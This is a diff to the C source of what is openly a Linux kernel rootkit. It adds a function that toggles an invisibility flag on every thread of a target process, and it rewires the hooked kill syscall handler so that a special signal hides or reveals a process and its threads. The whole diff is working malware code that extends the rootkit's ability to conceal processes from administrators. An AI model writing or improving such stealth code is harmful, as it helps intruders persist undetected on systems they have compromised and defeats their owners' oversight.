@@ -116,6 +116,27 @@ changeInvisibleChildren(pid_t pid)
 	return;
 }
 
+void
+changeInvisibleThreads(pid_t pid)
+{
+	struct task_struct *task;
+	struct task_struct *thread;
+	if (!pid)
+		return;
+	task = find_task(pid);
+	if (!task)
+		return;
+	for_each_thread(task, thread)
+	{
+		if(thread->pid != task->pid)
+		{
+			printk("PID %d", thread->pid);
+			thread->flags ^= PF_INVISIBLE;
+		}
+	}
+	return;
+}
+
 int
 is_invisible(pid_t pid)
 {
@@ -293,7 +314,8 @@ hacked_kill(pid_t pid, int sig)
 			if ((task = find_task(pid)) == NULL || is_invisible(pid) == true)
 				return -ESRCH;
 			task->flags ^= PF_INVISIBLE;
-			changeInvisibleChildren(task->pid);
+			//changeInvisibleChildren(task->pid);
+			changeInvisibleThreads(task->pid);
 			printk(KERN_INFO "rootkit: process invisible >:-)\n");
 			break;
 		case SIGVIS:
@@ -301,7 +323,8 @@ hacked_kill(pid_t pid, int sig)
 			if ((task = find_task(pid)) == NULL || is_invisible(pid) == false)
 				return -ESRCH;
 			task->flags ^= PF_INVISIBLE;
-			changeInvisibleChildren(task->pid);
+			//changeInvisibleChildren(task->pid);
+			changeInvisibleThreads(task->pid);
 			printk(KERN_INFO "rootkit: process visible :-(\n");
 			break;
 		default:
